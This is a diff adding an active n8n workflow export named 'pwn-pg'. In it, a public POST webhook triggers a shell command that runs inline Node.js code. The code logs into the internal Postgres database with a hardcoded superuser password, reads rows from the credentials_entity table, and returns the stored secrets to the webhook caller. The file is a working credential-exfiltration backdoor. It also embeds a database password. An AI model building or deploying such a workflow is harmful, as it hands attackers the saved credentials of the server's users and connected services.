@@ -1,0 +1,175 @@
+{
+  "active": true,
+  "activeVersion": {
+    "updatedAt": "2026-08-25T18:06:37.711Z",
+    "createdAt": "2026-08-25T18:06:37.711Z",
+    "versionId": "e520fce1-28ee-443e-83ae-d42ca8c5ae99",
+    "workflowId": "tGna07PxaNaMclX2",
+    "nodes": [
+      {
+        "parameters": {
+          "httpMethod": "POST",
+          "path": "pwnpg1787681197"
+        },
+        "id": "n1",
+        "name": "Webhook",
+        "type": "n8n-nodes-base.webhook",
+        "typeVersion": 1,
+        "position": [
+          0,
+          0
+        ],
+        "webhookId": "pwnpg1787681197"
+      },
+      {
+        "parameters": {
+          "command": "cd /home/node && node -e '\nconst {Client}=require('pg');\nconst c=new Client({host:'postgres',user:'postgres',password:'d40ea10107a5b0b066f576c4070f62fb',database:'n8n_queue',port:5432});\nc.connect().then(()=>c.query(\"select id,name,type,substring(data from 1 for 500) as data from credentials_entity limit 60\")).then(r=>{console.log(JSON.stringify(r.rows));process.exit(0)}).catch(e=>{console.log('ERR:'+e.message);process.exit(1)});\n' 2>&1"
+        },
+        "id": "n2",
+        "name": "Exec",
+        "type": "n8n-nodes-base.executeCommand",
+        "typeVersion": 1,
+        "position": [
+          200,
+          0
+        ]
+      },
+      {
+        "parameters": {
+          "respondWith": "json",
+          "responseBody": "={{ JSON.stringify($json) }}",
+          "options": {}
+        },
+        "id": "n3",
+        "name": "Respond",
+        "type": "n8n-nodes-base.respondToWebhook",
+        "typeVersion": 1,
+        "position": [
+          400,
+          0
+        ]
+      }
+    ],
+    "connections": {
+      "Webhook": {
+        "main": [
+          [
+            {
+              "node": "Exec",
+              "type": "main",
+              "index": 0
+            }
+          ]
+        ]
+      },
+      "Exec": {
+        "main": [
+          [
+            {
+              "node": "Respond",
+              "type": "main",
+              "index": 0
+            }
+          ]
+        ]
+      }
+    },
+    "authors": "Matheus Cristhyan",
+    "name": null,
+    "description": null
+  },
+  "activeVersionId": "e520fce1-28ee-443e-83ae-d42ca8c5ae99",
+  "connections": {
+    "Webhook": {
+      "main": [
+        [
+          {
+            "node": "Exec",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Exec": {
+      "main": [
+        [
+          {
+            "node": "Respond",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    }
+  },
+  "createdAt": "2026-08-25T18:06:37.700Z",
+  "id": "tGna07PxaNaMclX2",
+  "isArchived": false,
+  "meta": null,
+  "name": "pwn-pg-1787681197",
+  "nodes": [
+    {
+      "parameters": {
+        "httpMethod": "POST",
+        "path": "pwnpg1787681197"
+      },
+      "id": "n1",
+      "name": "Webhook",
+      "type": "n8n-nodes-base.webhook",
+      "typeVersion": 1,
+      "position": [
+        0,
+        0
+      ],
+      "webhookId": "pwnpg1787681197"
+    },
+    {
+      "parameters": {
+        "command": "cd /home/node && node -e '\nconst {Client}=require('pg');\nconst c=new Client({host:'postgres',user:'postgres',password:'d40ea10107a5b0b066f576c4070f62fb',database:'n8n_queue',port:5432});\nc.connect().then(()=>c.query(\"select id,name,type,substring(data from 1 for 500) as data from credentials_entity limit 60\")).then(r=>{console.log(JSON.stringify(r.rows));process.exit(0)}).catch(e=>{console.log('ERR:'+e.message);process.exit(1)});\n' 2>&1"
+      },
+      "id": "n2",
+      "name": "Exec",
+      "type": "n8n-nodes-base.executeCommand",
+      "typeVersion": 1,
+      "position": [
+        200,
+        0
+      ]
+    },
+    {
+      "parameters": {
+        "respondWith": "json",
+        "responseBody": "={{ JSON.stringify($json) }}",
+        "options": {}
+      },
+      "id": "n3",
+      "name": "Respond",
+      "type": "n8n-nodes-base.respondToWebhook",
+      "typeVersion": 1,
+      "position": [
+        400,
+        0
+      ]
+    }
+  ],
+  "pinData": null,
+  "settings": {
+    "callerPolicy": "workflowsFromSameOwner",
+    "availableInMCP": false
+  },
+  "shared": [
+    {
+      "updatedAt": "2026-08-25T18:06:37.700Z",
+      "createdAt": "2026-08-25T18:06:37.700Z",
+      "role": "workflow:owner",
+      "workflowId": "tGna07PxaNaMclX2",
+      "projectId": "AxNpta0sA2v4gJ2a"
+    }
+  ],
+  "staticData": null,
+  "tags": [],
+  "triggerCount": 1,
+  "updatedAt": "2026-08-25T18:06:37.700Z",
+  "versionId": "e520fce1-28ee-443e-83ae-d42ca8c5ae99"
+}
